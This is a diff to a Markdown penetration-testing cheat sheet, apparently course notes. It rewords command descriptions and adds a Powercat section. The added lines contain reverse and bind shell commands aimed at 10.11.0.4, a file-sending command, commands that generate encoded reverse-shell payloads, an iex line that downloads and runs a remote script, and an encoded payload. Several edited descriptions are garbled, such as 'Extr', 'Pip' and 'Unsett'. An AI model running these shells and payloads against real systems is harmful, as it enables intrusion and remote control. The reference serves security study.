@@ -351,8 +351,8 @@ socat - OPENSSL:10.11.0.4:443,verify=0                                       Con
 
 **Misc Commands**
 ```
-Set-ExecutionPolicy Unrestricted                                                                                  Setting the PowerShell execution policy.
-Get-ExecutionPolicy                                                                                               Getting value for ExecutionPolicy.
+Set-ExecutionPolicy Unrestricted                                                                                  Set the PowerShell execution policy.
+Get-ExecutionPolicy                                                                                               Get value for ExecutionPolicy.
 (new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')    Download a file.
 powershell -c "command"                                                                                           The -c option will execute the supplied command as if it were typed at the PowerShell prompt.
 ```
@@ -380,6 +380,28 @@ powershell -c "command"                                                         
 **Set up a bind shell with PowerShell**
 ```
 powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeNameSystem.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
+```
+
+**Powercat**
+
+Script: [powercat.ps1](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1).
+
+```
+powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1              Send a file.
+powercat -c 10.11.0.4 -p 443 -e cmd.exe                                   Send a reverse shell.
+powercat -l -p 443 -e cmd.exe                                             Set up a bind shell; -l option to create a listener, -p to specify the listening port number, -e to have an application executed once connected.
+powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1             Create a stand-alone payload.
+powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1     Create an encoded stand-alone payload with powercat.
+```
+
+**Load a remote PowerShell script using iex**
+```
+iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+```
+
+**Execute an encoded stand-alone payload using PowerShell**
+```
+powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHI...
 ```
 
 
@@ -503,9 +525,9 @@ sudo systemctl enable ssh                                Configure SSH to start 
 sudo systemctl start apache2                             Start the apache service in Kali.
 sudo ss -antlp | grep apache                             Confirm that apache has been started and is running.
 sudo systemctl enable apache2                            Enable apache to start at boot time.
-systemctl list-unit-files                                Displaying all available services.
+systemctl list-unit-files                                Display all available services.
 ps -fe                                                   Common ps syntax to list all the processes currently running; f: display full format listing (UID, PID, PPID, etc.), e: select all processes, C: select by command name
-sudo tail -f /var/log/apache2/access.log                 Monitoring the Apache log file using tail command.
+sudo tail -f /var/log/apache2/access.log                 Monitor the Apache log file using tail command.
 ```
 
 **Linux User Management**
@@ -539,12 +561,12 @@ ls /etc/apache2/wwwold/*.conf                            Display files with cert
 ls -a                                                    -a option is used to display all files.
 ls -1                                                    Display each file in a single line.
 ls -l                                                    Shows detailed information about the files and directories in a directory.
-ls -la /usr/bin | grep zip                               Searching for any file(s) in /usr/bin containing “zip”.
+ls -la /usr/bin | grep zip                               Search for any file(s) in /usr/bin containing “zip”.
 pwd                                                      Print the current directory.
 cd ~                                                     Return to the home/user directory.
 echo "test1" > test.txt                                  Saves "test1" in the new file "test.txt".
 echo "test2" >> test.txt                                 Add in a new line "test2" in the file "test.txt".
-echo "hack::the::world" | awk -F "::" '{print $1, $3}'   Extracting fields from a stream using a multi-character separator in awk.
+echo "hack::the::world" | awk -F "::" '{print $1, $3}'   Extr fields from a stream using a multi-character separator in awk.
 comm scan-a.txt scan-b.txt                               Compare files.
 diff -c scan-a.txt scan-b.txt                            Compare files, context format.
 diff -u scan-a.txt scan-b.txt                            Compare files, unified format.
@@ -574,18 +596,18 @@ apt show resource-agents                                 Examine information rel
 sudo apt install pure-ftpd                               apt install the pure-ftpd application.
 sudo apt remove --purge pure-ftpd                        apt remove –purge to completely remove the pure-ftpd application.
 sudo dpkg -i man-db_2.7.0.2-5_amd64.deb                  dpkg -i to install the man-db application.
-echo "I need to try hard" | sed 's/hard/harder/'         Replacing a word in the output stream.
-echo "Hack.The.World."| cut -f 3 -d "."                  Extracting fields from the echo command output using cut.
-cut -d ":" -f 1 /etc/passwd                              Extracting usernames from /etc/passwd using cut.
-wc -m < test.txt                                         Feeding the wc command with the < operator.
-cat test.txt | wc -m                                     Piping the output of the cat command into wc.
-wget -O report_w.pdf https://of.io/report.pdf            Downloading a file through wget.
-curl -o report_c.pdf https://of.io/report.pdf            Downloading a file with curl.
-axel -a -n 20 -o report_a.pdf https://of.io/report.pdf   Downloading a file with axel; -n: number of multiple connections to use, -a: more concise progress indicator, -o specify a different file name for the downloaded file
+echo "I need to try hard" | sed 's/hard/harder/'         Replac a word in the output stream.
+echo "Hack.The.World."| cut -f 3 -d "."                  Extract fields from the echo command output using cut.
+cut -d ":" -f 1 /etc/passwd                              Extract usernames from /etc/passwd using cut.
+wc -m < test.txt                                         Feed the wc command with the < operator.
+cat test.txt | wc -m                                     Pip the output of the cat command into wc.
+wget -O report_w.pdf https://of.io/report.pdf            Download a file through wget.
+curl -o report_c.pdf https://of.io/report.pdf            Download a file with curl.
+axel -a -n 20 -o report_a.pdf https://of.io/report.pdf   Download a file with axel; -n: number of multiple connections to use, -a: more concise progress indicator, -o specify a different file name for the downloaded file
 alias lsa='ls -la'                                       Create an alias "lsa" to execute the command "ls -la".
-alias mkdir='ping -c 1 localhost'                        Creating an alias that overrides the mkdir command.
-unalias mkdir                                            Unsetting an alias.
-cat ~/.bashrc                                            Examining the ".bashrc" default file, the system-wide file for Bash settings located at "/etc/bash.bashrc".
+alias mkdir='ping -c 1 localhost'                        Creat an alias that overrides the mkdir command.
+unalias mkdir                                            Unsett an alias.
+cat ~/.bashrc                                            Examin the ".bashrc" default file, the system-wide file for Bash settings located at "/etc/bash.bashrc".
 ```
 
 **Linux environment variables**
